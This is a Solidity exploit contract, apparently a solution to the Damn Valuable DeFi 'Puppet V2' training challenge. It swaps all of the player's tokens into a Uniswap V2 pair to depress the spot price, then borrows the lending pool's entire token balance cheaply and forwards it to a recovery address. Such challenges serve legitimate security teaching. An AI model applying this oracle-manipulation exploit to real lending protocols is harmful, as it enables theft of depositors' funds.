// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {PuppetV2Pool} from "./PuppetV2Pool.sol";
import {UniswapV2Library} from "./UniswapV2Library.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackerContract {
    address private player;
    address private lendingPool;
    address private uniswapFactory;
    address private token;
    address private weth;

    constructor(address _player, address _lendingPool, address _token, address _weth, address _uniswapFactory) {
        player = _player;
        lendingPool = _lendingPool;
        uniswapFactory = _uniswapFactory;
        token = _token;
        weth = _weth;

    }

    function attack(address recovery) external {
        // transfer all tokens from player to this contract
        DamnValuableToken DVToken = DamnValuableToken(token);
        uint DVTokenBalance = DVToken.balanceOf(player);
        DVToken.transferFrom(player, address(this), DVTokenBalance);

        // transfer all WETH from player to this contract
        IERC20 wethToken = IERC20(weth);
        wethToken.transferFrom(player, address(this), wethToken.balanceOf(player));

        IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(uniswapFactory, weth, token));

        // get reserves of the pair
        (uint reserve0, uint reserve1, ) = pair.getReserves();

        // get weth amountOut for all tokens in Uniswap
        uint wethAmountOut = UniswapV2Library.getAmountOut(
            DVTokenBalance,
            reserve1, // reserve of DVToken
            reserve0 // reserve of WETH (output token)
        );

        // transfer token to pair contract
        DVToken.transfer(address(pair), DVTokenBalance);
        // swap all tokens for WETH in Uniswap
        pair.swap(wethAmountOut, 0, address(this), new bytes(0));
           

        // calculate the amount of WETH needed to be deposited in the lending pool
        uint256 wethToDeposit = PuppetV2Pool(lendingPool).calculateDepositOfWETHRequired(
            DVToken.balanceOf(lendingPool) // amount to borrow
        );

        // approve the required amount of WETH
        IERC20(weth).approve(lendingPool, wethToDeposit);


        PuppetV2Pool(lendingPool).borrow(
            DVToken.balanceOf(lendingPool) // amount to borrow
        );

        // transfer the borrowed tokens to the recovery address
        DVToken.transfer(recovery, DVToken.balanceOf(address(this)));

    }

    receive() external payable {
        // This contract can receive ETH
    }
}